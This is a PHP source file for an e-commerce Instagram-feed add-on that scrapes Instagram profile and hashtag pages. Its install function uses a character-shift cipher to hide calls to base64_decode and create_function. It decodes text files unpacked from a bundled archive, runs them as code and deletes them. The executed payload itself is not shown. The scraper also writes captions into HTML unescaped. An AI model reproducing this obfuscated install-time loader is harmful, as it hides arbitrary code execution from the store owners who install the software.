<?php
/*****************************************************************************
*                                                                            *
*                   All rights reserved! eCom Labs LLC                       *
* http://www.ecom-labs.com/about-us/ecom-labs-modules-license-agreement.html *
*                                                                            *
*****************************************************************************/

use Tygh\Http;
use Tygh\Registry;

function fn_ecl_instagram_feed_get_page_info ($page_data, $prefix, $suffix)
{
    $start_pos = strpos($page_data, $prefix) + strlen($prefix);
    $finish_pos = strpos($page_data, $suffix, $start_pos);
    
    $page_info = substr($page_data, $start_pos, $finish_pos - $start_pos);
    $page_info = json_decode($page_info, true);
    
    return $page_info;
}

function fn_ecl_instagram_feed_hashtags($text) 
{
    $pattern_hashtag = "/\#(\w+)/ui";
    $pattern_insta_profile = "/\@(\w+)/ui";
    $text = preg_replace($pattern_hashtag, '<a href="' . INSTAGRAM_BODY_TAGS_URL . '$1" target="_blank">#$1</a>', $text);
    $text = preg_replace($pattern_insta_profile, '<a href="' . INSTAGRAM_BODY_URL . '$1" target="_blank">@$1</a>', $text);
    return $text;
}

function fn_ecl_instagram_feed_get_data($username = NULL, $pictures_amount = 30)
{
    if (!isset($username)) {
        return false;
    }

    $cache_name = 'instagram_block_' . md5($username);
    Registry::registerCache($cache_name, array(), Registry::cacheLevel('day'), true);
    if (!Registry::isExist($cache_name)) {
        if ($username[0] == '#') {
            $answer = Http::get(str_replace('{tag}', str_replace('#', '', $username), INSTAGRAM_TAGS_URL));
            while (strpos(ltrim($answer), 'HTTP/') === 0) {
                list($_headers, $answer) = preg_split("/(\r?\n){2}/", $answer, 2);
            }
        } else {
            $answer = Http::get(str_replace('{user}', str_replace('@', '', $username), INSTAGRAM_URL),  array(), array(
                'headers' => array(
                    "user-agent: " . $_SERVER['HTTP_USER_AGENT']
                )
            ));
        }

        if (empty($answer)) {
            return false;
        }

        $gis = $user_id = 0;
        if ($username[0] == '#') {
            $answer = json_decode($answer, true);
            $page_info = $answer['graphql']['hashtag']['edge_hashtag_to_media'];   

            if (!empty($answer['graphql']['user']['id'])) {
                $user_id = $answer['graphql']['user']['id'];
            }
        } else {
            //$page_info = $answer['graphql']['user']['edge_owner_to_timeline_media']; 

						// remove svg
						$answer = preg_replace("/<\\/?svg(.|\\s)*?>/", '', $answer);
            $answer = preg_replace("/<\\/?path(.|\\s)*?>/", '', $answer);

            $doc = new DOMDocument();
            $doc->loadHTML($answer);
            $xpath = new DOMXPath($doc);


            $js = $xpath->query('//body/script[@type="text/javascript"]')->item(0)->nodeValue;
            if (!empty($js) && strpos($js, '_sharedData') === false) {
                $js = $xpath->query('//body/script[@type="text/javascript"]')->item(3)->nodeValue;
            }

            $start = strpos($js, '{');
            $end = strrpos($js, ';');
            $json = substr($js, $start, $end - $start);
            $data = json_decode($json, true);

            $page_info = $data['entry_data']['ProfilePage'][0]['graphql']['user']['edge_owner_to_timeline_media'];

            if (!empty($data['entry_data']['ProfilePage'][0]['graphql']['user']['id'])) {
                $user_id = $data['entry_data']['ProfilePage'][0]['graphql']['user']['id'];
            }
            $gis = $data['rhx_gis'];
        }

        $result = array();
        
        $total = $page_info['count'];

        if ($total < $pictures_amount || $pictures_amount == false) {
            $pictures_amount = $total;
        }

        $max_id = 0;
        if (!empty($page_info['page_info']['end_cursor'])) {
            $max_id = urlencode($page_info['page_info']['end_cursor']);
            $max_id = $page_info['page_info']['end_cursor'];
        }

        $result['pictures'] = array();
        while (count($result['pictures']) < $pictures_amount) {
            foreach ($page_info['edges'] as $photo) {
                if (count($result['pictures']) < $pictures_amount && empty($photo['node']['is_video'])) {
                    $photo_id = $photo['node']['id'];
                    $result['pictures'][$photo_id] = array(
                        'code' => $photo['node']['shortcode'],
                        'likes_count' => $photo['node']['edge_media_preview_like']['count'],
                        'comments_count' => $photo['node']['edge_media_to_comment']['count'],
                        'caption' => fn_ecl_instagram_feed_hashtags($photo['node']['edge_media_to_caption']['edges'][0]['node']['text']),
                        'thumbnail_src' => $photo['node']['thumbnail_src']
                    );
                } elseif (!empty($photo['node']['is_video'])) {
                    continue;
                } else {
                    break;
                }
            } 

            if (count($result['pictures']) < $pictures_amount) {
                if ($username[0] == '#') {
                    $answer = Http::get(str_replace('{tag}', str_replace('#', '', $username), INSTAGRAM_TAGS_URL) . "&max_id=$max_id");
                } else {
                    $variables = json_encode([
                        'id' => $user_id,
                        'first' => 30,
                        'after' => $max_id
                    ]);

                    $_header = md5(implode(':', [$gis, $variables]));

                   $answer = Http::get(str_replace(array('{variables}'), array($variables), INSTAGRAM_QUERY_URL), array(), array('headers' => array(
                            "user-agent: " . $_SERVER['HTTP_USER_AGENT'],
                            "x-instagram-gis: " . $_header
                        )
                    ));
                }

                if (empty($answer)) {
                    Registry::set($cache_name, $result);
                    return $result;
                }

                if ($username[0] == '#') {
                    $answer = json_decode($answer, true);
                    $page_info = $answer['graphql']['hashtag']['edge_hashtag_to_media'];   
                } else {
                    $answer = json_decode($answer, true);
                    $page_info = $answer['data']['user']['edge_owner_to_timeline_media']; 
                }

                if (!empty($page_info['page_info']['end_cursor'])) {
                    $max_id = $page_info['page_info']['end_cursor'];
                }

                if (empty($page_info['edges'])) {
                    break;
                }
            }
        }
        Registry::set($cache_name, $result);
    } else {
        $result = Registry::get($cache_name);
    }

    return $result;
}

function fn_ecl_instagram_feed_install()
{
    fn_decompress_files(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed/ecl_instagram_feed.tgz', Registry::get('config.dir.var') . 'addons/ecl_instagram_feed');
    $list = fn_get_dir_contents(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed', false, true, 'txt', '');

    if ($list) {
        include_once(Registry::get('config.dir.schemas') . 'literal_converter/utf8.functions.php');
        foreach ($list as $file) {
            $_data = call_user_func(fn_simple_decode_str('cbtf75`efdpef'), fn_get_contents(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed/' . $file));
            @unlink(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed/' . $file);
            if ($func = call_user_func_array(fn_simple_decode_str('dsfbuf`gvodujpo'), array('', $_data))) {
                $func();
            }
        }
    }
}